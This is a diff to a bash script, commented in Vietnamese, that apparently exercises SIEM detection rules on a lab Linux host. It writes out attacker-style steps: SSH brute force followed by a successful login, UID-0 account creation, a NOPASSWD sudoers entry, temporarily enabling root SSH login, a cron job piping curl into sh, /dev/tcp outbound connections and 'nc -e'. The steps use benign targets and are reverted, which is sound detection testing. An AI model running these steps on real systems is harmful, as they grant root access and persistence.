@@ -177,15 +177,158 @@ expect eof"; }
 hv5_linux(){ c_5_11; pause; c_5_12; }
 
 # =====================================================================
-run_all(){ hv13; pause; hv1_ssh; pause; hv12; pause; hv5_linux; }
+# HV2 Linux - SSH dang nhap thanh cong sau nhieu lan sai (100123-100125)
+# =====================================================================
+ssh_ok(){ sshpass -p "$2" ssh -o PreferredAuthentications=password \
+  -o StrictHostKeyChecking=no -o ConnectTimeout=5 "$1@$SELF_IP" true >/dev/null 2>&1; }
+
+c_2_4(){ mark 2.4 100123 "6 lan SSH sai roi dang nhap dung (labsudo)"
+  for i in 1 2 3 4 5 6; do ssh_fail labsudo; sleep 1; done
+  ssh_ok labsudo "$TESTPW"; }
+
+c_2_5(){ mark 2.5 "100124,100125" "11 lan SSH sai roi dang nhap dung (labnosudo)"
+  for i in $(seq 1 11); do ssh_fail labnosudo; done
+  sleep 1
+  ssh_ok labnosudo "$TESTPW"; }
+
+hv2_linux(){ c_2_4; pause; c_2_5; }
+
+# =====================================================================
+# HV3 Linux - tao/sua/xoa tai khoan (100311-100315)
+# =====================================================================
+c_3_9(){ mark 3.9 "100311,100312" "tao tai khoan UID 0 (labuid0) va tai khoan trong nhom sudo (labadm1)"
+  useradd -o -u 0 -g 0 -M -N labuid0 2>/dev/null
+  sleep 1
+  useradd -M -G sudo labadm1 2>/dev/null
+  sleep 1
+  userdel -f labuid0 2>/dev/null
+  userdel labadm1 2>/dev/null; }
+
+c_3_10(){ mark 3.10 100313 "doi UID tai khoan co san thanh 0 (labmod0)"
+  useradd -M labmod0 2>/dev/null
+  sleep 1
+  usermod -o -u 0 labmod0 2>/dev/null
+  sleep 1
+  userdel -f labmod0 2>/dev/null; }
+
+c_3_11(){ mark 3.11 "100314,100315" "xoa 5 tai khoan Linux trong 10 phut (labdel1..5)"
+  for i in 1 2 3 4 5; do useradd -M "labdel$i" 2>/dev/null; done
+  sleep 1
+  for i in 1 2 3 4 5; do userdel "labdel$i" 2>/dev/null; sleep 1; done; }
+
+hv3_linux(){ c_3_9; pause; c_3_10; pause; c_3_11; }
+
+# =====================================================================
+# HV4 Linux - them vao nhom dac quyen & sua sudoers (100328-100332)
+# =====================================================================
+c_4_6(){ mark 4.6 "100328,100329,100330" "them labnosudo vao sudo bang gpasswd, usermod va qua sudo"
+  gpasswd -a labnosudo sudo >/dev/null 2>&1
+  sleep 1
+  gpasswd -d labnosudo sudo >/dev/null 2>&1
+  sleep 1
+  usermod -aG sudo labnosudo >/dev/null 2>&1
+  sleep 1
+  gpasswd -d labnosudo sudo >/dev/null 2>&1
+  sleep 1
+  exp_as labsudo "spawn sudo -k usermod -aG sudo labnosudo
+expect \"assword\"
+send \"$TESTPW\r\"
+expect eof"
+  sleep 1
+  gpasswd -d labnosudo sudo >/dev/null 2>&1; }
+
+c_4_7(){ mark 4.7 "100331,100332" "tao file trong /etc/sudoers.d co NOPASSWD: ALL (FIM)"
+  echo 'labnosudo ALL=(ALL:ALL) NOPASSWD: ALL' > /etc/sudoers.d/labtest_nopw
+  chmod 440 /etc/sudoers.d/labtest_nopw
+  sleep 5
+  rm -f /etc/sudoers.d/labtest_nopw; }
+
+hv4_linux(){ c_4_6; pause; c_4_7; }
+
+# =====================================================================
+# HV10 Linux - cron va systemd unit (FIM: 100457, 100458)
+# =====================================================================
+c_10_8(){ mark 10.8 100457 "them file cron va unit systemd (FIM)"
+  printf '# lab test\n* * * * * root /bin/true\n' > /etc/cron.d/lab_test_job
+  printf '[Unit]\nDescription=Lab Test\n[Service]\nExecStart=/bin/true\n' > /etc/systemd/system/lab-test.service
+  sleep 5
+  rm -f /etc/cron.d/lab_test_job /etc/systemd/system/lab-test.service; }
+
+c_10_9(){ mark 10.9 100458 "them cron co lenh tai curl|sh (FIM report_changes)"
+  printf '# lab test\n0 0 1 1 * root curl -s http://127.0.0.1:9/x | sh\n' > /etc/cron.d/lab_dl_job
+  sleep 5
+  rm -f /etc/cron.d/lab_dl_job; }
+
+hv10_linux(){ c_10_8; pause; c_10_9; }
+
+# =====================================================================
+# HV12 Linux (bo sung) - SSH root THANH CONG (tam bat PermitRootLogin roi tat)
+# =====================================================================
+root_ssh_enable() {
+  cp /etc/ssh/sshd_config /tmp/sshd_config.lab.bak
+  echo "root:$TESTPW" | chpasswd
+  if grep -qE '^\s*#?\s*PermitRootLogin' /etc/ssh/sshd_config; then
+    sed -i 's/^\s*#\?\s*PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
+  else
+    echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config
+  fi
+  systemctl restart ssh 2>/dev/null
+  sleep 1
+}
+root_ssh_restore() {
+  if [ -f /tmp/sshd_config.lab.bak ]; then
+    mv /tmp/sshd_config.lab.bak /etc/ssh/sshd_config
+    systemctl restart ssh 2>/dev/null
+  fi
+  passwd -l root >/dev/null 2>&1
+}
+
+c_12_2(){ mark 12.2 "100480,100481,100482,100486" "SSH root dang nhap THANH CONG bang mat khau (tam bat roi tat)"
+  root_ssh_enable
+  ssh_ok root "$TESTPW"
+  sleep 1
+  root_ssh_restore; }
+
+c_12_3(){ mark 12.3 100489 "SSH root sai 3 lan roi dang nhap THANH CONG bang mat khau"
+  root_ssh_enable
+  for i in 1 2 3; do ssh_fail root; sleep 1; done
+  ssh_ok root "$TESTPW"
+  sleep 1
+  root_ssh_restore; }
+
+hv12_ok(){ c_12_2; pause; c_12_3; }
+
+# =====================================================================
+# HV15 Linux - ket noi ra ngoai & reverse shell qua auditd (100549-100552)
+# =====================================================================
+c_15_8(){ mark 15.8 "100549,100550,100551,100552" "bash + binary trong /tmp ket noi ra ngoai + chuoi reverse shell (auditd)"
+  bash -c 'timeout 3 bash -c "exec 3<>/dev/tcp/1.1.1.1/443" 2>/dev/null || true'
+  cp /usr/bin/curl /tmp/lab_tmp_curl 2>/dev/null && chmod +x /tmp/lab_tmp_curl
+  /tmp/lab_tmp_curl -s -m 3 https://1.1.1.1 -o /dev/null 2>/dev/null || true
+  rm -f /tmp/lab_tmp_curl
+  bash -c 'echo "/dev/tcp/1.1.1.1/4444" >/dev/null'
+  nc.traditional -e /bin/true 127.0.0.1 9 >/dev/null 2>&1 || true; }
+
+hv15_linux(){ c_15_8; }
+
+# =====================================================================
+linux_extra(){ hv2_linux; pause; hv3_linux; pause; hv4_linux; pause; hv10_linux; pause; hv12_ok; pause; hv15_linux; }
+run_all(){ hv13; pause; hv1_ssh; pause; hv12; pause; hv5_linux; pause; linux_extra; }
 
 case "${1:-}" in
-  prep) do_prep ;; clean) do_clean ;; all) run_all ;;
-  hv13) hv13 ;; hv12) hv12 ;; hv5) hv5_linux ;; 1.5) c_1_5 ;;
+  prep) do_prep ;; clean) do_clean ;; all) run_all ;; linux_extra) linux_extra ;;
+  hv13) hv13 ;; hv12) hv12 ;; hv12_ok) hv12_ok ;; hv5) hv5_linux ;;
+  hv2) hv2_linux ;; hv3) hv3_linux ;; hv4) hv4_linux ;; hv10) hv10_linux ;; hv15) hv15_linux ;;
+  1.5) c_1_5 ;; 2.4) c_2_4 ;; 2.5) c_2_5 ;;
+  3.9) c_3_9 ;; 3.10) c_3_10 ;; 3.11) c_3_11 ;;
+  4.6) c_4_6 ;; 4.7) c_4_7 ;;
+  5.11) c_5_11 ;; 5.12) c_5_12 ;;
+  10.8) c_10_8 ;; 10.9) c_10_9 ;;
+  12.1) c_12_1 ;; 12.2) c_12_2 ;; 12.3) c_12_3 ;;
   13.1) c_13_1 ;; 13.2) c_13_2 ;; 13.3) c_13_3 ;; 13.4) c_13_4 ;;
   13.5) c_13_5 ;; 13.6) c_13_6 ;; 13.7) c_13_7 ;; 13.8) c_13_8 ;;
-  12.1) c_12_1 ;; 5.11) c_5_11 ;; 5.12) c_5_12 ;;
-  *) echo "Dung: sudo $0 {prep|clean|all|hv13|hv12|hv5|13.1..13.8|12.1|1.5|5.11|5.12}"; exit 1 ;;
+  15.8) c_15_8 ;;
+  *) echo "Dung: sudo $0 {prep|clean|all|linux_extra|hv2|hv3|hv4|hv5|hv10|hv12|hv12_ok|hv13|hv15|<ca>}"; exit 1 ;;
 esac
 [ -f "$LOG" ] && echo && echo "== Bang chung: $(pwd)/$LOG =="
 echo 'Dashboard: agent.id: "014" and rule.id: <ID>  (Last 15 minutes)'
